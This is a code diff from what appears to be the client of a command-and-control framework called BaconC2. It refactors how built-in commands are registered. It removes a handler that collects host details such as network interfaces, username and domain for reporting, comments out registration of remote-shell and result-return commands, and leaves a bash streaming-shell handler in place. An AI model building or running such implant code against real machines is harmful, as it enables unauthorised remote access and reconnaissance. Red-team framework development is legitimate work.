@@ -1,4 +1,4 @@
-package commands
+package registry
 
 import (
 	"fmt"
@@ -6,9 +6,10 @@ import (
 	"sync"
 	"time"
 
-	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
+	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/system"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/formatter"
@@ -26,61 +27,41 @@ const (
 	ReturnResultsCommand BuiltInCommand = "return_results"
 )
 
-func RegisterBuiltInCommands(registry *CommandHandlerRegistry, resultsQueue queue.IResultQueue, transport transport.ITransportProtocol, streamingTransport local_models.IStreamingTransport) {
-	registry.RegisterHandler(string(SysInfoCommand), func(cmd models.Command) models.CommandResult {
-		return getInfoHandler(cmd, resultsQueue)
-	})
+func RegisterBuiltInCommands(
+	registry *command_handler.CommandHandlerRegistry,
+	resultsQueue queue.IResultQueue,
+	transport transport.ITransportProtocol,
+	streamingTransport local_models.IStreamingTransport,
+) {
+	registry.RegisterHandler(*system.NewGetInfoCommandHandler())
 
-	registry.RegisterHandler(string(StartShellCommand), func(cmd models.Command) models.CommandResult {
-		return startShellHandler(cmd, resultsQueue, streamingTransport)
-	})
-
-	registry.RegisterHandler(string(ReturnResultsCommand), func(cmd models.Command) models.CommandResult {
-		return returnResultsHandler(cmd, transport)
-	})
 }
 
-func getInfoHandler(cmd models.Command, resultsQueue queue.IResultQueue) models.CommandResult {
-	sysInfo, err := sysinfo.GatherExtendedInfo()
-	if err != nil {
-		return models.CommandResult{
-			ID:     cmd.ID,
-			Status: "error",
-			Output: formatter.ToJsonString(map[string]string{"error": fmt.Sprintf("Failed to gather extended system info: %v", err)}),
-		}
-	}
-
-	output := map[string]interface{}{
-		"network_interfaces": sysInfo.NetworkInterfaces,
-		"architecture":       sysInfo.Architecture,
-		"cpu_info":           sysInfo.CPUInfo,
-		"memory_total":       sysInfo.MemoryTotal,
-		"memory_free":        sysInfo.MemoryFree,
-		"disk_total":         sysInfo.DiskTotal,
-		"disk_free":          sysInfo.DiskFree,
-		"uptime":             sysInfo.Uptime,
-		"process_count":      sysInfo.ProcessCount,
-		"username":           sysInfo.Username,
-		"domain":             sysInfo.Domain,
-		"last_boot_time":     sysInfo.LastBootTime,
-	}
-
-	result := models.CommandResult{
-		ID:     cmd.ID,
-		Status: "success",
-		Output: formatter.ToJsonString(output),
-	}
-
-	if err := resultsQueue.Add(result); err != nil {
-		return models.CommandResult{
-			ID:     cmd.ID,
-			Status: "error",
-			Output: formatter.ToJsonString(map[string]string{"error": fmt.Sprintf("Failed to queue result: %v", err)}),
-		}
-	}
-
-	return result
-}
+// func RegisterBuiltInCommands(
+// 	registry *command_handler.CommandHandlerRegistry,
+// 	resultsQueue queue.IResultQueue,
+// 	transport transport.ITransportProtocol,
+// 	streamingTransport local_models.IStreamingTransport,
+// ) {
+// 	registry.RegisterHandler(command_handler.CommandHandler{
+// 		Name: string(SysInfoCommand),
+// 		Handler: func(cmd models.Command) models.CommandResult {
+// 			return common.GetInfoHandler(cmd, resultsQueue)
+// 		},
+// 	})
+// 	registry.RegisterHandler(command_handler.CommandHandler{
+// 		Name: string(StartShellCommand),
+// 		Handler: func(cmd models.Command) models.CommandResult {
+// 			return startShellHandler(cmd, resultsQueue, streamingTransport)
+// 		},
+// 	})
+// 	registry.RegisterHandler(command_handler.CommandHandler{
+// 		Name: string(ReturnResultsCommand),
+// 		Handler: func(cmd models.Command) models.CommandResult {
+// 			return returnResultsHandler(cmd, transport)
+// 		},
+// 	})
+// }
 
 func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, streamingTransport local_models.IStreamingTransport) models.CommandResult {
 	config := local_models.NewStreamingConfig(local_models.ShellTypeBash, "xterm")
